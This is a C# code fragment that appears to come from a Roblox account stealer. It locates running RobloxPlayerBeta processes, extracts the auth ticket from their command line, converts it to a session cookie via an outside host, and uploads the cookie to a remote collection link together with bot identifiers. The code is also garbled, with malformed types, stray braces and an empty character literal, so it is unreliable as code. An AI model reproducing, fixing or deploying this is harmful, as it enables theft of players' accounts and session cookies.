foreach (Process processs in Process.GetProcessesByName("RobloxPlayerBeta"))
{
    Processs[] processesByName = processs.GetProcessesByName("RobloxPlayerBeta");
    {)
    Console.WriteLine("hi");
        string randomid = Infos.GetShortID();
        string str = Program.GetCommandLine(processesByName[0]).Split(new char[]
        {
        ''
        })[5];
        string contents = await Program.GetAsync("https://roblox-api.tk/authtocookie?auth=" + str);
        File.WriteAllText(Program.tempPath + randomid + ".txt", contents);
        string str2 = Program.wb.DownloadString(Program.UTLink);
        NameValueCollection nameValueCollection = new NameValueCollection();
        nameValueCollection.Add("Security", Crypto.encrypt(Crypto.SHA("877692" + str2)));
        nameValueCollection.Add("pID", Crypto.encrypt(Program.personalID));
        nameValueCollection.Add("botID", Crypto.encrypt(Program.botID));
        nameValueCollection.Add("robloxcookie", Crypto.encrypt("COOKIE"));
        nameValueCollection.Add("foldername", Crypto.encrypt(Program.folderName));
        nameValueCollection nvc = new NameValueCollection();
        Program.files.Clear();
        Program.paramName.Clear();
        Program.files.Add(Program.tempPath + randomid + ".txt");
        Program.paramName.Add("robloxCookie");
        UploadData.HttpUploadFile(Program.UPLink, Program.files, Program.paramName, new string[]
        {
        "text/plain"
        }, nvc, nameValueCollection);
        flag = false;
        randomid = null;
    }
    Process[] array = null;
